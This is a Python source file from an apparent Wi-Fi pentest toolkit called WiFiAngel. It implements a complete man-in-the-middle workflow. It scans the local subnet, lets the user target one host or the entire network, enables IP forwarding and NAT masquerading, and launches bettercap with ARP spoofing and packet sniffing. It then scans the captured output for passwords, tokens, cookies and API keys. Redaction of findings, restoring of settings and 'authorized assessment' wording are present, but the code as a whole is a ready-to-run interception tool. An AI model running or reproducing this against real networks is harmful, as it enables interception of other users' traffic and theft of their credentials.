"""MITM assessment service helpers and entrypoint."""

from __future__ import annotations

import os
import re
import shutil
import signal
import socket
import subprocess
import threading
import time
import traceback
from datetime import datetime
from pathlib import Path

import netifaces
from rich import box
from rich.align import Align
from rich.console import Group
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.text import Text
from scapy.all import ARP, Ether, srp

from adapters.system_tools import (
    arp_lookup_command,
    bettercap_command,
    bettercap_stdin_eval_command,
    parse_mac_from_arp_output,
    ping_probe_command,
)
from app.safety import redact_sensitive_text
from app.ui.theme import BORDER_STYLE


def run_mitm_attack(app) -> None:
    """Run MITM assessment workflow."""
    run_mitm_attack_impl(app)


def run_mitm_attack_impl(app) -> None:
    """Run an authorized MITM assessment with ARP spoofing and metadata capture."""
    if os.geteuid() != 0:
        app.console.print("[bold red]This assessment requires root privileges![/]")
        return
    if not shutil.which("bettercap"):
        app.console.print("[bold red]bettercap is required for this assessment![/]")
        app.console.print("To install: sudo apt-get install bettercap")
        return

    app.console.clear()

    interfaces = {}
    gateways = {}
    try:
        for interface in netifaces.interfaces():
            if interface == "lo":
                continue
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                ip = addrs[netifaces.AF_INET][0]["addr"]
                if ip.startswith("127.") or not re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                    continue
                interfaces[interface] = ip
        gateway_info = netifaces.gateways()
        if "default" in gateway_info and netifaces.AF_INET in gateway_info["default"]:
            gw_info = gateway_info["default"][netifaces.AF_INET]
            gateways[gw_info[1]] = gw_info[0]
    except Exception as exc:
        app.console.print(f"[bold red]Error getting network information: {str(exc)}[/]")
        return

    app.console.clear()
    iface_table = Table(
        title="[heading]Available Network Interfaces[/]",
        box=box.MINIMAL,
        border_style=BORDER_STYLE,
        show_header=True,
        header_style="bold bright_white",
    )
    iface_table.add_column("#", style="menu.key", justify="right", width=4)
    iface_table.add_column("Interface", style="cyan")
    iface_table.add_column("IP", style="green")
    iface_table.add_column("Gateway", style="yellow")
    for i, (iface, ip) in enumerate(interfaces.items(), 1):
        iface_table.add_row(str(i), iface, ip, str(gateways.get(iface, "Unknown")))
    app.console.print(
        Panel(
            Group(
                iface_table,
                Text(""),
                Text("[meta]Enter the interface number below, or 0 to cancel.  |  Ctrl+C where supported[/]"),
            ),
            title="[title]WiFiAngel - MITM toolkit[/]",
            border_style=BORDER_STYLE,
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    choice = Prompt.ask("Interface #", choices=["0"] + [str(i) for i in range(1, len(interfaces) + 1)])
    if choice == "0":
        return
    selected_iface = list(interfaces.keys())[int(choice) - 1]
    selected_ip = interfaces[selected_iface]
    selected_gateway = gateways.get(selected_iface, None)
    if not selected_gateway:
        app.console.print(f"[bold red]No gateway found for interface {selected_iface}![/]")
        return

    network_prefix = ".".join(selected_ip.split(".")[:3]) + "."
    online_hosts: dict = {}
    scan_cancel = threading.Event()
    saved_sigint = signal.getsignal(signal.SIGINT)

    def _mitm_scan_sigint(_signum, _frame):
        scan_cancel.set()

    signal.signal(signal.SIGINT, _mitm_scan_sigint)
    try:
        app.console.print("[bold cyan]Scanning network for live hosts (Ctrl+C to cancel)...[/]")
        last_report = 0
        for i in range(1, 255):
            if scan_cancel.is_set():
                break
            if i == 1 or i - last_report >= 40:
                pct = int(100 * i / 254)
                app.console.print(f"[dim]Probe {i}/254 ({pct}%)...[/]")
                last_report = i
            ip = f"{network_prefix}{i}"
            if ip == selected_ip:
                continue
            try:
                result = subprocess.run(
                    ["ping", "-c", "1", "-W", "0.2", ip],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=0.5,
                )
                if result.returncode == 0:
                    try:
                        hostname = socket.gethostbyaddr(ip)[0]
                    except OSError:
                        hostname = "Unknown"
                    try:
                        mac = app.get_mac(ip, selected_iface)
                    except Exception:
                        mac = "Unknown"
                    online_hosts[ip] = {"hostname": hostname, "mac": mac}
            except (subprocess.TimeoutExpired, OSError, Exception):
                pass
    finally:
        signal.signal(signal.SIGINT, saved_sigint)

    if scan_cancel.is_set():
        app.console.print("[bold yellow]Scan cancelled (Ctrl+C).[/]")
        if not online_hosts:
            app.console.print("[dim]No hosts found; exiting MITM toolkit.[/]")
            return
        app.console.print(
            f"[cyan]Continuing with {len(online_hosts)} host(s) discovered before cancel.[/]"
        )

    tgt_table = Table(
        title="[heading]Available Targets[/]",
        box=box.MINIMAL,
        border_style=BORDER_STYLE,
        show_header=True,
        header_style="bold bright_white",
    )
    tgt_table.add_column("#", style="menu.key", justify="right", width=4)
    tgt_table.add_column("Address / Mode", style="cyan")
    tgt_table.add_column("Hostname", style="green")
    tgt_table.add_column("MAC", style="yellow")
    tgt_table.add_row("1", "All devices (entire subnet)", "-", "-")
    for j, (ip, info) in enumerate(online_hosts.items(), 2):
        tgt_table.add_row(str(j), ip, info["hostname"], info["mac"])
    app.console.print(
        Panel(
            Group(
                tgt_table,
                Text(""),
                Text("[meta]Enter target number below, or 0 to cancel.[/]"),
            ),
            title="[title]WiFiAngel - MITM toolkit[/]",
            border_style=BORDER_STYLE,
            box=box.ROUNDED,
            padding=(1, 2),
        )
    )

    target_choices = ["0", "1"] + [str(i) for i in range(2, len(online_hosts) + 2)]
    target_choice = Prompt.ask("Target #", choices=target_choices)
    if target_choice == "0":
        return
    if target_choice == "1":
        target_ip = ""
        target_desc = "Entire Network"
    else:
        target_ip = list(online_hosts.keys())[int(target_choice) - 2]
        target_desc = f"{target_ip} - {online_hosts[target_ip]['hostname']}"

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_dir = Path(f"logs/mitm/{timestamp}")
    log_dir.mkdir(parents=True, exist_ok=True)
    traffic_log = log_dir / "traffic.txt"
    http_log = log_dir / "http.log"
    findings_log = log_dir / "redacted_findings.log"

    bettercap_script = log_dir / "bettercap.cap"
    bettercap_options = f"""set net.sniff.verbose false
set net.sniff.local true
set net.sniff.filter tcp
net.sniff on
events.stream on
set events.stream.output {log_dir}/events.log
set http.proxy.http_log {http_log}
set dns.spoof.all false
net.recon on
arp.spoof on"""
    if target_ip:
        bettercap_options += f"\n\nset arp.spoof.targets {target_ip}"
    with open(bettercap_script, "w") as f:
        f.write(bettercap_options)

    with open(findings_log, "w") as f:
        f.write(f"# Redacted findings log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("# Common secret-bearing patterns are redacted before storage.\n\n")

    app.console.print("\n[bold green]Man in the Middle Assessment Setup[/]")
    app.console.print(f"[bold cyan]Preparing assessment on {target_desc} via {selected_iface}...[/]")
    original_ip_forward = None
    original_iptables = []
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            original_ip_forward = f.read().strip()
        result = subprocess.run(["iptables", "-t", "nat", "-S"], capture_output=True, text=True)
        original_iptables = result.stdout
        app.console.print("[bold blue]Enabling IP forwarding...[/]")
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
        app.console.print("[bold blue]Setting up traffic forwarding rules...[/]")
        subprocess.run(
            ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", selected_iface, "-j", "MASQUERADE"],
            stdout=subprocess.DEVNULL,
        )
        app.console.print("[bold blue]Stopping any running BetterCAP instances...[/]")
        subprocess.run(["pkill", "-f", "bettercap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        with open(traffic_log, "w") as f:
            f.write(f"# Traffic log started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Interface: {selected_iface}, IP: {selected_ip}, Gateway: {selected_gateway}\n\n")
        app.console.print("[bold green]Starting BetterCAP and preparing assessment environment...[/]")
        bettercap_stdout_file = open(os.path.join(log_dir, "bettercap_stdout.log"), "w")
        bettercap_stderr_file = open(os.path.join(log_dir, "bettercap_stderr.log"), "w")
        bettercap_cmd = f"bettercap -iface {selected_iface} -caplet {bettercap_script}"
        bettercap_process = subprocess.Popen(
            bettercap_cmd.split(),
            stdout=bettercap_stdout_file,
            stderr=bettercap_stderr_file,
            universal_newlines=True,
        )
        time.sleep(3)
        if bettercap_process.poll() is not None:
            app.console.print("[bold red]BetterCAP failed to start! Please check log files.[/]")
            if "bettercap_stdout_file" in locals() and not bettercap_stdout_file.closed:
                bettercap_stdout_file.close()
            if "bettercap_stderr_file" in locals() and not bettercap_stderr_file.closed:
                bettercap_stderr_file.close()
            app._restore_settings(original_ip_forward, original_iptables)
            return

        app.console.print("\n[bold white on red]Ctrl+C stops the MITM session when you are done.[/]")

        def _mitm_simplify_traffic_line(raw: str) -> tuple[str, str, str]:
            s = (raw or "").strip()
            if not s:
                return ("--", "—", "")
            ts = "--"
            m_ts = re.match(r"^\[(\d{1,2}:\d{2}:\d{2})\]\s*", s)
            if m_ts:
                ts = m_ts.group(1)
                s = s[m_ts.end():].strip()
            tag = "·"
            m_mod = re.search(r"\[net\.sniff\.(\w+)\]", s, re.I)
            if m_mod:
                tag = m_mod.group(1).upper()
                s = re.sub(r"\s*\[net\.sniff\.\w+\]\s*", " ", s, count=1).strip()
            if tag == "·":
                m_svc = re.search(r"\b(https?\.proxy|http\.proxy|any\.proxy|net\.recon|arp\.spoof|dns\.spoof)\b", s, re.I)
                if m_svc:
                    tag = m_svc.group(1).replace(".", " ").upper()[:14]
            s = re.sub(r"\s+", " ", s)
            if len(s) > 88:
                s = s[:87] + "…"
            return (ts, tag, s)

        layout = Layout(name="root")
        layout.split_column(Layout(name="header", size=4), Layout(name="body", ratio=1), Layout(name="footer", size=1))
        layout["body"].split_row(Layout(name="left_column", ratio=3), Layout(name="right_column", ratio=2))
        layout["left_column"].split_column(Layout(name="network_traffic", ratio=3), Layout(name="redacted_findings", ratio=2))
        layout["right_column"].split_column(Layout(name="session", ratio=2), Layout(name="clients", ratio=3))
        attack_stats = {"start_time": time.time(), "packets": 0, "bytes": 0, "clients": {}, "last_traffic": [], "sensitive_matches": []}

        def update_traffic_log(data):
            try:
                with open(traffic_log, "a") as f:
                    f.write(f"{datetime.now().strftime('%H:%M:%S')} - {redact_sensitive_text(data)}\n")
            except Exception:
                pass

        def update_findings_log(data):
            try:
                with open(findings_log, "a") as f:
                    f.write(f"{datetime.now().strftime('%H:%M:%S')} - {redact_sensitive_text(data)}\n")
            except Exception:
                pass

        with Live(layout, refresh_per_second=2, screen=True) as live:
            try:
                while True:
                    if bettercap_process.poll() is not None:
                        layout["body"].update(
                            Panel("[bold red]BetterCAP unexpectedly stopped. Assessment terminated.[/]", border_style=BORDER_STYLE, box=box.MINIMAL)
                        )
                        live.refresh()
                        time.sleep(2)
                        break
                    elapsed = time.time() - attack_stats["start_time"]
                    hours, remainder = divmod(elapsed, 3600)
                    minutes, seconds = divmod(remainder, 60)
                    elapsed_str = f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
                    try:
                        ifconfig_output = app.command_runner.check_output(["ifconfig", selected_iface])
                        rx_match = re.search(r"RX packets (\d+).*?bytes (\d+)", ifconfig_output, re.DOTALL)
                        if rx_match:
                            attack_stats["packets"] = int(rx_match.group(1))
                            attack_stats["bytes"] = int(rx_match.group(2))
                        arp_output = app.command_runner.check_output(["arp", "-a"])
                        for line in arp_output.splitlines():
                            match = re.search(r"\((\d+\.\d+\.\d+\.\d+)\) at ([0-9a-f:]+)", line)
                            if match:
                                ip, mac = match.groups()
                                if mac != "00:00:00:00:00:00" and mac != "ff:ff:ff:ff:ff:ff" and ip not in attack_stats["clients"]:
                                    hostname = "Unknown"
                                    try:
                                        hostname = socket.gethostbyaddr(ip)[0]
                                    except Exception:
                                        pass
                                    attack_stats["clients"][ip] = {"mac": mac, "first_seen": datetime.now(), "hostname": hostname}
                                    update_traffic_log(f"New client detected: {ip} ({mac}) - {hostname}")
                        patterns = ["password", "passwd", "pwd", "auth", "secret", "token", "authorization", "cookie", "api_key"]
                        try:
                            with open(os.path.join(log_dir, "bettercap_stdout.log"), "r") as f:
                                lines = f.readlines()
                                if lines:
                                    for line in lines[-50:]:
                                        redacted_line = redact_sensitive_text(line.strip())
                                        if any(pattern in line.lower() for pattern in ["http", "tcp", "udp", "dns"]):
                                            if redacted_line not in attack_stats["last_traffic"]:
                                                attack_stats["last_traffic"].append(redacted_line)
                                                update_traffic_log(redacted_line)
                                        if any(pattern in line.lower() for pattern in patterns):
                                            if redacted_line not in attack_stats["sensitive_matches"]:
                                                attack_stats["sensitive_matches"].append(redacted_line)
                                                update_findings_log(redacted_line)
                                    attack_stats["last_traffic"] = attack_stats["last_traffic"][-15:]
                                    attack_stats["sensitive_matches"] = attack_stats["sensitive_matches"][-15:]
                        except Exception:
                            pass
                    except Exception:
                        pass

                    header = Panel(
                        Group(
                            Text.assemble(
                                ("WiFiAngel MITM", "bold white"),
                                ("    ", ""),
                                (elapsed_str, "bold cyan"),
                                ("  elapsed", "dim cyan"),
                                ("  ·  ", "dim"),
                                (target_desc, "bold yellow"),
                            ),
                            Text("Ctrl+C to stop", style="dim red", justify="center"),
                        ),
                        border_style=BORDER_STYLE,
                        box=box.MINIMAL,
                        padding=(0, 1),
                    )
                    layout["header"].update(header)
                    session_tbl = Table(show_header=False, box=box.MINIMAL, border_style=BORDER_STYLE, pad_edge=False, expand=True)
                    session_tbl.add_column("", style="dim", justify="right", width=14, no_wrap=True)
                    session_tbl.add_column("", style="white")
                    session_tbl.add_row("Interface", f"[cyan]{selected_iface}[/]")
                    session_tbl.add_row("Local IP", f"[green]{selected_ip}[/]")
                    session_tbl.add_row("Gateway", f"[yellow]{selected_gateway}[/]")
                    session_tbl.add_row("RX packets", f"{attack_stats['packets']:,}")
                    session_tbl.add_row("RX data", app._format_bytes(attack_stats["bytes"]))
                    session_tbl.add_row("ARP clients", f"{len(attack_stats['clients']):,}")
                    session_tbl.add_row("Mode", "[dim]ARP spoof · sniff[/]")
                    layout["session"].update(Panel(session_tbl, title="[bold]Session[/]", border_style=BORDER_STYLE, box=box.ROUNDED, padding=(0, 1)))
                    traffic_table = Table(box=box.MINIMAL, border_style=BORDER_STYLE, show_header=True, header_style="bold dim", pad_edge=False, expand=True)
                    traffic_table.add_column("#", style="dim", justify="right", width=3)
                    traffic_table.add_column("Time", style="dim", width=8, no_wrap=True)
                    traffic_table.add_column("Tag", style="cyan", width=8, no_wrap=True, overflow="ellipsis")
                    traffic_table.add_column("Event", style="green")
                    if attack_stats["last_traffic"]:
                        for i, line in enumerate(attack_stats["last_traffic"][-12:]):
                            t, tag, detail = _mitm_simplify_traffic_line(line)
                            traffic_table.add_row(str(i + 1), t, tag, detail or "[dim]—[/]")
                    else:
                        traffic_table.add_row("", "", "", "[dim]Waiting for traffic…[/]")
                    layout["network_traffic"].update(
                        Panel(traffic_table, title="[bold]Live traffic[/]", subtitle="[dim]BetterCAP / sniff[/]", border_style=BORDER_STYLE, box=box.ROUNDED, padding=(0, 1))
                    )
                    sens_tbl = Table(box=box.MINIMAL, border_style=BORDER_STYLE, show_header=True, header_style="bold dim", pad_edge=False, expand=True)
                    sens_tbl.add_column("#", style="dim", width=3, justify="right")
                    sens_tbl.add_column("Match", style="red")
                    if attack_stats["sensitive_matches"]:
                        for i, line in enumerate(attack_stats["sensitive_matches"][-8:]):
                            s = re.sub(r"\s+", " ", line.strip())
                            if len(s) > 96:
                                s = s[:95] + "…"
                            sens_tbl.add_row(str(i + 1), s)
                    else:
                        sens_tbl.add_row("", "[dim]No pattern hits yet (password, token, auth…)[/]")
                    layout["redacted_findings"].update(
                        Panel(sens_tbl, title="[bold red]Redacted findings[/]", border_style="red", box=box.ROUNDED, padding=(0, 1))
                    )
                    clients_table = Table(show_header=True, box=box.MINIMAL, border_style=BORDER_STYLE, header_style="bold dim", pad_edge=False, expand=True)
                    clients_table.add_column("IP", style="cyan", min_width=14, no_wrap=True, overflow="ignore")
                    clients_table.add_column("MAC", style="dim", min_width=17, no_wrap=True, overflow="ignore")
                    clients_table.add_column("Host", style="blue", ratio=1, overflow="fold")
                    if attack_stats["clients"]:
                        sorted_clients = sorted(attack_stats["clients"].items(), key=lambda x: x[1]["first_seen"], reverse=True)
                        for ip, data in sorted_clients[:18]:
                            clients_table.add_row(ip, data["mac"], data.get("hostname") or "—")
                    else:
                        clients_table.add_row("—", "—", "[dim]No ARP clients yet[/]")
                    layout["clients"].update(
                        Panel(clients_table, title="[bold]Clients (ARP)[/]", border_style=BORDER_STYLE, box=box.ROUNDED, padding=(0, 1))
                    )
                    footer = Panel(
                        Align.center(
                            Text(
                                "Ctrl+C stops the session",
                                style="dim white",
                            )
                        ),
                        style="on red",
                        box=box.MINIMAL,
                        padding=(0, 1),
                    )
                    layout["footer"].update(footer)
                    time.sleep(0.5)
            except KeyboardInterrupt:
                app.console.print("\n[bold yellow]MITM assessment stopped by user.[/]")
            finally:
                if "bettercap_stdout_file" in locals() and not bettercap_stdout_file.closed:
                    bettercap_stdout_file.close()
                if "bettercap_stderr_file" in locals() and not bettercap_stderr_file.closed:
                    bettercap_stderr_file.close()
                app._restore_settings(original_ip_forward, original_iptables, bettercap_process)
                app.console.print(f"\n[bold green]Assessment completed. All logs saved to {log_dir}[/]")
                if attack_stats["sensitive_matches"]:
                    app.console.print("\n[bold red]Redacted Findings Summary:[/]")
                    for data in attack_stats["sensitive_matches"][-5:]:
                        app.console.print(f"[red]{redact_sensitive_text(data)}[/]")
                app.console.print("\n[bold green]Traffic Summary:[/]")
                app.console.print(f"Total Packets: {attack_stats['packets']:,}")
                app.console.print(f"Total Data: {app._format_bytes(attack_stats['bytes'])}")
                app.console.print(f"Unique Clients: {len(attack_stats['clients']):,}")
    except Exception as exc:
        app.console.print(f"\n[bold red]Error during MITM assessment: {str(exc)}[/]")
        traceback.print_exc()
        if "original_ip_forward" in locals() and "original_iptables" in locals():
            app._restore_settings(
                original_ip_forward,
                original_iptables,
                bettercap_process if "bettercap_process" in locals() else None,
            )


def restore_settings(app, original_ip_forward, original_iptables, bettercap_process=None) -> None:
    """Restore system settings after MITM assessment."""
    app.console.print("[bold blue]Restoring system settings...[/]")

    if bettercap_process:
        try:
            bettercap_process.terminate()
            try:
                bettercap_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                bettercap_process.kill()
            app.console.print("[green]BetterCAP stopped[/]")
        except Exception:
            app.console.print("[yellow]Failed to stop BetterCAP gracefully[/]")

    app.command_runner.run(
        ["pkill", "-9", "-f", "bettercap"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    if original_ip_forward is not None:
        try:
            app.command_runner.run(
                ["sysctl", f"net.ipv4.ip_forward={original_ip_forward}"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            app.console.print("[green]IP forwarding restored[/]")
        except Exception:
            app.console.print("[red]Failed to restore IP forwarding[/]")

    if original_iptables:
        try:
            app.command_runner.run(["iptables-restore"], input=original_iptables, text=True)
            app.console.print("[green]Firewall rules restored[/]")
        except Exception:
            try:
                app.command_runner.run(["iptables", "-F"])
                app.command_runner.run(["iptables", "-t", "nat", "-F"])
                app.console.print("[yellow]Firewall rules flushed[/]")
            except Exception:
                app.console.print("[red]Failed to restore firewall rules[/]")


def format_bytes(bytes_value):
    """Convert bytes to human-readable format."""
    bytes_value = float(bytes_value)
    if bytes_value < 1024:
        return f"{bytes_value:.0f} B"
    if bytes_value < 1024**2:
        return f"{bytes_value/1024:.2f} KB"
    if bytes_value < 1024**3:
        return f"{bytes_value/(1024**2):.2f} MB"
    return f"{bytes_value/(1024**3):.2f} GB"


def get_mac(app, ip, interface):
    """Get MAC address of any device on the same network."""

    def read_arp_cache():
        try:
            output = app.command_runner.check_output(
                arp_lookup_command(ip),
                stderr=subprocess.DEVNULL,
                text=True,
            )
        except Exception as exc:
            app.logger.debug(f"ARP cache lookup failed for {ip}: {str(exc)}")
            return None
        return parse_mac_from_arp_output(output)

    try:
        mac_address = read_arp_cache()
        if mac_address:
            return mac_address

        app.command_runner.run(
            ping_probe_command(ip),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        mac_address = read_arp_cache()
        if mac_address:
            return mac_address

        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2,
            iface=interface,
            verbose=0,
        )
        if ans:
            return ans[0][1].hwsrc
        return None
    except Exception as exc:
        app.logger.error(f"Error getting MAC address: {str(exc)}")
        return None


def start_bettercap(app, interface, target_ip, gateway, script_path=None):
    """Start BetterCAP for MITM assessments with error handling."""
    try:
        app.console.print("[bold yellow]Stopping any running BetterCAP instances...[/]")
        app.command_runner.run(
            ["pkill", "-9", "-f", "bettercap"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(3)

        cmd = bettercap_command(interface, script_path)
        app.console.print(f"[bold blue]Starting BetterCAP with command: {' '.join(cmd)}[/]")
        process = app.command_runner.popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
            env=dict(os.environ, LC_ALL="C"),
        )
        if process is None:
            return None

        time.sleep(5)
        if process.poll() is not None:
            stdout, stderr = process.communicate()
            if stderr:
                app.console.print(f"[bold red]Error starting BetterCAP: {stderr}[/]")
            return None

        try:
            app.console.print("[bold blue]Verifying ARP spoofing status...[/]")
            if os.path.exists("/proc/net/arp"):
                with open("/proc/net/arp", "r", encoding="utf-8", errors="ignore") as arp_table:
                    _ = arp_table.read()
                app.console.print("[green]ARP table verification complete[/]")
            else:
                app.console.print("[yellow]Could not verify ARP spoofing status[/]")
        except Exception as exc:
            app.console.print(f"[yellow]Could not verify ARP spoofing: {str(exc)}[/]")

        try:
            app.command_runner.run(
                bettercap_stdin_eval_command(interface),
                input="arp.spoof on\n",
                text=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            app.console.print("[bold green]Manually activated ARP spoofing[/]")
        except Exception:
            pass

        return process
    except Exception as exc:
        app.console.print(f"[bold red]Error starting BetterCAP: {str(exc)}[/]")
        return None
